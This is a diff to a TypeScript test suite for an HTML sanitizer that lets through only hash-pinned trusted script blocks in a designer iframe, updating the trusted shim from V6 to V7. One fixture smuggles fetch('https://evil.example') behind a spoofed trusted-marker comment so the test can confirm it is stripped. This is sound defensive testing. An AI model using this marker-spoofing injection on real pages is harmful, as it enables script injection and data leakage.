@@ -40,6 +40,8 @@ function scriptBody(block: string): string {
 
 const REAL_EDIT_SHIM = apiConstant('DESIGNER_EDIT_SHIM');
 const REAL_FIT_ENGINE = apiConstant('DESIGNER_LAYOUT_ENGINE');
+/** The one statement EDUCMS-SHIM-V7 adds to V6 (2026-09-23). */
+const PARENT_ONLY_GUARD = 'if(e.source!==window.parent)return;';
 
 const MALICIOUS = [
   '<!doctype html><html><head><style>.s{color:red}</style></head>',
@@ -77,7 +79,7 @@ describe('buildSafeDesignerSrcdoc (W0-02 containment)', () => {
     // require that any block mentioning the message is the trusted shim itself.
     const blocks = out.split('<script').filter((b) => b.includes('educms-action'));
     expect(blocks.length).toBeGreaterThan(0); // the trusted emit must survive
-    for (const b of blocks) expect(b).toContain('EDUCMS-SHIM-V6');
+    for (const b of blocks) expect(b).toContain('EDUCMS-SHIM-V7');
   });
   it('strips on* handler attributes (onclick, svg onload)', () => {
     expect(out).not.toMatch(/onclick=|onload=/i);
@@ -93,7 +95,7 @@ describe('buildSafeDesignerSrcdoc (W0-02 containment)', () => {
     expect(out).toContain('__VOS_CW=1920');
     const nonce = (out.match(/script-src 'nonce-([a-f0-9]+)'/) || [])[1];
     expect(nonce).toBeTruthy();
-    expect(out).toContain(`<script nonce="${nonce}">/*EDUCMS-SHIM-V6*/`);
+    expect(out).toContain(`<script nonce="${nonce}">/*EDUCMS-SHIM-V7*/`);
     expect(out).toContain(`<script nonce="${nonce}">/*VOS-CANVAS*/`);
   });
   it('injects the trusted VOS-STAGE-SCALE runtime with the render nonce', () => {
@@ -129,9 +131,18 @@ describe('INJ-004 — trust is structural, not substring', () => {
   });
 
   it('does NOT trust a block that merely PREFIXES the marker comment onto other code', () => {
-    const evil = "<script>/*EDUCMS-SHIM-V6*/fetch('https://evil.example')</script>";
-    expect(isTrustedScriptBlock(evil)).toBe(false);
-    expect(buildSafeDesignerSrcdoc(evil)).not.toContain('evil.example');
+    for (const marker of ['EDUCMS-SHIM-V6', 'EDUCMS-SHIM-V7']) {
+      const evil = `<script>/*${marker}*/fetch('https://evil.example')</script>`;
+      expect(isTrustedScriptBlock(evil)).toBe(false);
+      expect(buildSafeDesignerSrcdoc(evil)).not.toContain('evil.example');
+    }
+  });
+
+  it('does NOT trust the real V7 with one byte changed — a body is trusted by its exact hash', () => {
+    const tampered = REAL_EDIT_SHIM.replace('if(e.source!==window.parent)return;', 'if(e.source===null)return;');
+    expect(tampered).not.toBe(REAL_EDIT_SHIM);
+    expect(isTrustedScriptBlock(tampered)).toBe(false);
+    expect(buildSafeDesignerSrcdoc('<html><head>' + tampered + '</head><body></body></html>')).not.toContain('EDUCMS-SHIM-V7');
   });
 
   it('does NOT trust a block with code BEFORE the marker comment', () => {
@@ -166,9 +177,30 @@ describe('INJ-004 — trust is structural, not substring', () => {
 describe('INJ-004 — registry drift guard', () => {
   const entry = (marker: string) => TRUSTED_RUNTIMES.find((r) => r.marker === marker)!;
 
-  it('registry pins the current EDUCMS-SHIM-V6 body', () => {
+  it('registry pins the current EDUCMS-SHIM-V7 body', () => {
     const digest = sha256Hex(scriptBody(REAL_EDIT_SHIM));
-    expect(entry('EDUCMS-SHIM-V6').hashes).toContain(digest);
+    expect(entry('EDUCMS-SHIM-V7').hashes).toContain(digest);
+  });
+
+  it('V7 is the last V6 plus the parent-only guard — nothing else, byte for byte', () => {
+    // Take the one statement back out and put the V6 marker back: what is left
+    // must be EXACTLY the last V6 ever baked (the body every board kept between
+    // 2026-09-12 and V7 carries) — and that body must still be pinned.
+    const v7 = scriptBody(REAL_EDIT_SHIM);
+    expect(v7.indexOf('/*EDUCMS-SHIM-V7*/')).toBe(0);
+    expect(v7.split(PARENT_ONLY_GUARD).length - 1).toBe(1);
+    const v6 = '/*EDUCMS-SHIM-V6*/' + v7.slice('/*EDUCMS-SHIM-V7*/'.length).replace(PARENT_ONLY_GUARD, '');
+    const LAST_V6 = 'cd11aff07ab7d8afb3c597fa27f5f4ce3fee0a62cf23874b0b1d1cb72194dc79';
+    expect(sha256Hex(v6)).toBe(LAST_V6);
+    expect(entry('EDUCMS-SHIM-V6').hashes).toContain(LAST_V6);
+  });
+
+  it('every V6 body ever pinned stays pinned (saved boards carry them)', () => {
+    expect(entry('EDUCMS-SHIM-V6').hashes).toEqual([
+      'cd11aff07ab7d8afb3c597fa27f5f4ce3fee0a62cf23874b0b1d1cb72194dc79',
+      '1ae3e413f28c9e8bfe4d106a84ff13e79eeceae8a6d7c6db97035a78db73a574',
+      'cf2a1204382b12dc2978eee7ce0b62d0ffca6c49b6e133b130715acacc6c066b',
+    ]);
   });
 
   it('registry pins the current VOS-FIT-ENGINE body', () => {
